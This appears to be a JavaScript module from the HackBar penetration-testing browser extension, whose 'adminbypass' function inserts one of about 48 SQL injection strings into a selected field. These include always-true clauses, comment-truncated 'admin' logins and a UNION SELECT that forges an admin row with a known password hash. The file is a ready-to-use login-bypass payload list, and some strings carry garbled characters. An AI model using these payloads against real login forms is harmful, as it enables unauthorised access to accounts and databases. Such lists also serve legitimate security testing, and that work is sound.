HackBar.ModAdmin = {
	
	adminbypass: function (choice)	{
		var str = choice;
		switch (str){
		case '1': 
				txt = "' or ''='";
				break;
		case '2': 
				txt = "' or 1='1";
				break;
		case '3': 
				txt = "' or '1'='1";
				break;
		case '4': 
				txt = "' or ' 1=1";
				break;
		case '6': 
				txt = "' or 1=1--";
				break;
		case '7': 
				txt = "' or 1=1#";
				break;
		case '8': 
				txt = "' or 1=1/*";
				break;
		case '9': 
				txt = "') or '1'='1--";
				break;
		case '10': 
				txt = "') or ('1'='1--";
				break;
		case '11': 
				txt = "' or 1=1)#";
				break;
		case '12': 
				txt = "' or '1?='1";
				break;
		case '13': 
				txt = "' or 'x'='x";
				break;
		case '14': 
				txt = "' or 0=0 –";
				break;
		case '15': 
				txt = "or 0=0 –";
				break;
		case '16': 
				txt = "' or 0=0 #";
				break;
		case '17': 
				txt = "or 0=0 #";
				break;
		case '18': 
				txt = "' or 'x'='x";
				break;
		case '19': 
				txt = "') or ('x'='x";
				break;
		case '20': 
				txt = "' or 1=1–";
				break;
		case '21': 
				txt = "' or a=a–";
				break;
		case '22': 
				txt = "') or ('a'='a";
				break;
		case '23': 
				txt = "hi' or 1=1 –";
				break;
		case '24': 
				txt = "'or'1=1?";
				break;
		case '25': 
				txt = "'-'";
				break;
		case '26': 
				txt = "' '";
				break;
		case '27': 
				txt = "'&'";
				break;
		case '28': 
				txt = "'^'";
				break;
		case '29': 
				txt = "'*'";
				break;
		case '30': 
				txt = "' or ''-'";
				break;
		case '31': 
				txt = "' or '' '";
				break;
		case '32': 
				txt = "' or ''&'";
				break;
		case '33': 
				txt = "' or ''^'";
				break;
		case '34': 
				txt = "' or ''*'";
				break;
		case '35': 
				txt = "or true--";
				break;
		case '36': 
				txt = "' or true--";
				break;
		case '37': 
				txt = "') or ('x')=('x";
				break;
		case '38': 
				txt = "')) or (('x'))=(('x";
				break;
		case '39': 
				txt = "admin' --";
				break;
		case '40': 
				txt = "admin' #";
				break;
		case '41': 
				txt = "admin'/*";
				break;
		case '42': 
				txt = "admin' or '1'='1";
				break;
		case '43': 
				txt = "admin' or '1'='1'--";
				break;
		case '44': 
				txt = "admin' or '1'='1'#";
				break;
		case '45': 
				txt = "admin' or '1'='1'/*";
				break;
		case '46': 
				txt = "admin'or 1=1 or ''='";
				break;
		case '47': 
				txt = "admin') or ('1'='1";
				break;
		case '48': 
				txt = "admin') or ('1'='1'/*";
				break;
		case '49': 
				txt = "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055";
				break;

		}	
		hackBar.setSelectedText( txt ); 
	  }
	  
}